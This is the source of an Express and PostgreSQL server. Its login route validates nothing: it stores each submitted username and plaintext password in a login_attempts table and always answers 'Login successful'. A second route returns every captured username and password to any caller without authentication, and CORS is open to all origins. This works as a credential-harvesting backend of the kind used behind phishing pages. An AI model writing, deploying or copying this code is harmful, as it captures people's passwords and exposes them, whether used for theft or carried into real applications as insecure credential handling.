const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const pool = require('./db/Connection');  // Your PostgreSQL pool setup

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors({ origin: '*' }));
app.use(bodyParser.json());

// POST /api/auth/login (you already have this)
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  try {
    await pool.query(
      'INSERT INTO login_attempts (username, password) VALUES ($1, $2)',
      [username, password]
    );

    return res.status(200).json({
      message: 'Login successful',
      user: { username }
    });
  } catch (error) {
    console.error('Database insert error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

// GET /api/users - fetch all users
app.get('/api/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, username, password FROM login_attempts');
    res.json(result.rows);
  } catch (error) {
    console.error('Database fetch error:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// DELETE /api/users/:id - delete a user by id
app.delete('/api/users/:id', async (req, res) => {
  const userId = req.params.id;

  try {
    const result = await pool.query('DELETE FROM login_attempts WHERE id = $1 RETURNING *', [userId]);

    if (result.rowCount === 0) {
      return res.status(404).json({ message: 'User not found' });
    }

    res.status(200).json({ message: 'User deleted' });
  } catch (error) {
    console.error('Database delete error:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
